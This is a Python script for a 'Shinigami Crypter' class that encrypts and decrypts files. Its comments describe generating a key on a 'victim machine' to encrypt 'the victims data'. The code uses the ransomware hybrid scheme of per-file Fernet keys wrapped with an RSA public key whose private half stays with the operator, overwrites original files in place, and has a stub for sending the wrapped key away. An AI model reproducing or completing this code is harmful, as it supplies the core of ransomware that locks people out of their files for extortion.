#I want to create a script that would be used for encrypting/decrypting text and files

#Useful libraries that I would be working with 
import os
import sys
from cryptography.fernet import Fernet
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP
import config
import shinigami_fernet_decryptor as sfd
import traceback

#Declaring the class
class Crypter:
    def __init__(self):
        self.key_ = config.GetKey()
        self.privateKey = self.key_.privateKey()
        self.publicKey = self.key_.publicKey()

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generateKey(self):
        key =  Fernet.generate_key() # Generates a url safe(base64 encoded) key
        crypter_ = Fernet(key) # Creates a Fernet object with encrypt/decrypt methods
        return key, crypter_

    #This function would help us encrypt the fernet key that will be used to encrypt the file
    def encryptedKey(self, fernetKey):
        publicKey = RSA.import_key(self.publicKey) # This gets the Public RSA key
        publicCrypter =  PKCS1_OAEP.new(publicKey) # Public encrypter object
        encFernetKey = publicCrypter.encrypt(fernetKey) # Encrypted fernet key
        return encFernetKey

    #This function handles the decryption of the fernet key
    def decryptedKey(self, fernetKey):
        decFernetKey = sfd.decrypt_(fernetKey, self.privateKey)
        return decFernetKey

    #This functions does the main cryption of the file
    def cryptFile(self, crypter_, file, encrypted):
        try:
            if os.path.isdir(file) == True or os.path.isfile(file) == True:
                with open(file, 'rb') as f:
                    data = f.read() # Read data from file
            else:
                if type(file) == bytes:
                    data = file
                else:
                    data = bytes(file, "utf-8")
            #print(f"Data: {data}") # Print file contents - [debugging]
            if encrypted == False:
                _data = crypter_.encrypt(data) # Encrypt data from file
                #print(f"Data_: {_data}")
                stat = f'> {file} encrypted successfully'
                print(stat) # Log file encrypted and print encrypted contents - [debugging]
            elif encrypted == True:
                _data = crypter_.decrypt(data) # Decrypt data from file
                #print(f"Data_: {_data}")
                stat = f'> {file} decrypted successfully'
                print(stat) # Log file encrypted and print encrypted contents - [debugging]
            else:
                raise SyntaxError("'encrypted' is a boolean argument")

            if os.path.isdir(file) == True or os.path.isfile(file) == True:
                with open(file, 'wb') as fp:
                    fp.write(_data) # Write encrypted/decrypted data to file using same filename to overwrite original file
                file_ = file
            else:
                file_ = _data
        except Exception as e:
            stat = f'> {file} not crypted due to [{e}]'
            print(f"Stat: {stat}")
            file_ = None
      
        return file_, stat
        
    #This function handles the encryption and returns the encrypted fernet key
    def encrypter(self, filePath, send = False, recipient = None):
        try:
            #if os.path.exists(filePath) == False:
            #    raise FileNotFoundError()
            key, crypter_ = self.generateKey()
            file_, stat = self.cryptFile(crypter_, filePath, encrypted = False)
            encFernetKey = self.encryptedKey(key)
            
            if send:
                if os.path.exists(filePath) == True:
                    a = os.path.basename(filePath)
                    filename_ = a.split(".")
                    name = filename_[0]
                else:
                    name = "Object"
                filename = f"{name}_encFernetKey.txt"
                with open(filename, "wb") as enc:
                    enc.write(encFernetKey)
                print(f"{filename} successfully sent")
                os.remove(filename)
            #stat = "file encrypted successfully"
        except Exception as e:
            stat = f"An error occurred in the encrypter function due to [{traceback.format_exc()}]"
            encFernetKey = None
            file_ = None
            print(stat)
        return file_, encFernetKey, stat

    #This function handles the decryption
    def decrypter(self, filePath, encFernetKey):
        print(f"First Decrypter: {encFernetKey}, Type: {type(encFernetKey)}")
        try:
            #if os.path.exists(filePath) == False:
            #    raise FileNotFoundError()
            
            if os.path.exists(encFernetKey):
                with open(encFernetKey, "rb") as enc:
                    enc_Fernet_Key = enc.read()
                os.remove(encFernetKey)
            else:
                if type(encFernetKey) != bytes:
                    enc_Fernet_Key = bytes(encFernetKey, "utf-8")
                else:
                    enc_Fernet_Key = encFernetKey
            print(f"Decrypter: {enc_Fernet_Key}, Type: {type(enc_Fernet_Key)}")
            decFernetKey = self.decryptedKey(enc_Fernet_Key)
            crypter_ = Fernet(decFernetKey)
            file_, stat = self.cryptFile(crypter_, filePath, encrypted = True)
        except Exception as e:
            stat = f"An error occurred in the decrypter function due to [{traceback.format_exc()}]"
            print(stat)
            file_ = None
        return file_, stat

if __name__ == "__main__":
    print("SHINIGAMI CRYPTER \n")

    c = Crypter() 
    #a, b = c.encrypter("sars.jpg")
    #print(f"Text: {a}")
    #print(f"EncFernetKey: {b}")

    #enc = b'\x88\x98\x08\x83P\xe7lt\xc88\x01\xe6\xd9\xf2!hPmC^_\xb2\xa5JL\xdc~\x044\x10\x15\xa6\x84_e\xdd\xaa\xe0\xb3HZ4\x8f\xba\xb9#\xb7\x17\xd2\xa9j\x7f\x11\xa4\x18g\x87n0\xcf\xad\xb0\xc4<\xe3\x0b\x1b\xceq\xfb\x9bh]\xa6\xa8\xf7\xadz\x123\xc2m\xd8ze\xf8\xd1\x05\x8e\xa0\x8a@\xe6\x1cS\x96\xe9\x13\xd7\x1f1\xe63\xf7\x0e\xf4O\xd1a\xe0\x16=\xa4\xc3\xfb\xb8\xc5\xac\xa5\x19(;t\xc8\x03\x87\xfe7\xc5v\x1e%Z\x1e\x04(\x88\xce}\x88\xbb\xd5\xf4@\xe39\xd6H\xa6\x80S\xdfR\xd3.\xd3\xbb\x0f\x96\xdfo\x16\x1bD\xbd7[\x8fn\xa1\xcac\x82W\xb9\x1b\n\xed\xd12\x94b\xf4`\xf4\xf8\xfb\x95\xd1DP\xac\x0eaM\xb8\xe3P\xa9}\xca\xf9Qr{7\xd6.\xd6\xd5,\xd7\x0e\xd0y\x7f\xed\xc4p\x14\x9a\x8a\xfa\xa7\x0b\xcb@\x92\xdc\x99N]A&"uO\x9b\xf1\xfcc\x16/\x1c\x06\xa7\xf3\x8f\x19\x1f\xee8:h\x1a\x14'
    #t = "sars.jpg"
    #d = c.decrypter(t, enc)
    #print(f"Dec: {d}")

    print("\nExecuted successfully!!")